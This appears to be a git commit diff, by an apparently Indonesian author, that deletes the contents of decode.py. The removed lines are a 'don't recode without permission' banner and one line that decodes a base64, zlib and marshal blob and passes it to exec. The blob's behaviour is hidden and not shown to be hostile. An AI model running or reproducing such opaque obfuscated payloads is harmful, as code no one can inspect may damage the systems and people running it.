d737cfd446eca5a677f22c0d07058c19f7aea598
Reza-XD <94230332+Reaper-XD@users.noreply.github.com>
2022-01-08 14:26:13 +0700

    Update decode.py

--- decode.py
+++ decode.py
@@ -1,6 +1,1 @@
-##############################
-##GAK PAHAM ELU YANG PEMULA ##
-## RECODE IZIN DULU SAMA GUA##
-##############################
-import marshal, zlib, base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJyVUm1r2zAQLuybfsVNw1QGI5K4y6BhX5p2pElDwpYyRlKCbCuJqG0ZSXnb2B/ar9zZbtyWscEOIfmeO92je3z215uzs3eQ6WSbSqKyQhsHmTB2I9IAvqcqCiASVnYvAtA2AHvEzYg80RkZDOEj0EUYzlu9sJNRMpidgLDVayMwavyw9puEdi8MEZg2CR+qhHHjtyv/6hno1sALym5JOXzm7FQZ943/vvJJdlzGOtUG8TkBtMEwgMEsgBEuPK5wjQPAhcUCuA9gCg9kL0wu8ErdK483WsWSnWr5RFuOWjiZMRqnUhj6ClqpdSod9CfXNxgojModUM8u/2rUY6MXicyzt571Pfv15q4/Gd/AbALjb/Cl//l2OmvCFDyGjYwD3LCTp8//4HPmeFlJUoqDb+fCrHfz9gORh1gWro7Jg3KMLlooaa+Vba1YS7iE4ug2Ou9AImOdSF4cYaXS8sR+iVpBrh0ODC+E23Blyxgz/h8Fq9/8CYMwU4l4hGuF8m0fRf62LFPqrwuZ401upEiYTyKEnsaTJ9ussEz4JEawHFUe66ww0loW+SRBsJ5cHnUvZF4+k8VY1e4wcv6vUV/k8iBjduJJtUgsqwjKbk8UTe1aAkZ//KQ+2jkh1aNpiS5LRQKge+rzvcHumN3xlTaZcCzxffJa3EiajbAqRX2t2ElwGoSFpo5PfgOsahUy"))))
+
